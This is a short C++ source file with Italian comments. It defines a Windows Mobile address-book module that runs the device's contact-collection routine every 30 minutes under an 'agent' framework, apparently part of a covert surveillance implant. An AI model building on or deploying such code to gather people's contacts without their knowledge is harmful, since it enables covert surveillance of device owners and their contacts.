#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "FunctionFunc.h"
#include "PoomCommon.h"
#include "Log.h"
#include "PoomAddressbook.h"


DWORD WINAPI AddressbookModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE agentHandle;

	me->setStatus(MODULE_RUNNING);
	agentHandle = me->getEvent();

	CPoomAddressbook *poom = poom->self();

	DBG_TRACE(L"Debug -  Addressbook.cpp -  Addressbook Module started\n", 5, FALSE);


	LOOP 
	{
		if (poom->IsValid()) {
			poom->Run(MODULE_ADDRESSBOOK);
		} else {
			DBG_TRACE(L"Debug -  Addressbook.cpp -  Addressbook err 2 \n", 5, FALSE);
			me->setStatus(MODULE_STOPPED);
			return TRUE;
		}

		_WaitForSingleObject(agentHandle, 1800000); // controlla ogni 30 minuti che vi siano aggiornamenti della rubrica

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug -  Addressbook.cpp -  Addressbook Module is Closing\n", 1, FALSE);
			delete poom;

			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}

	return 0;

}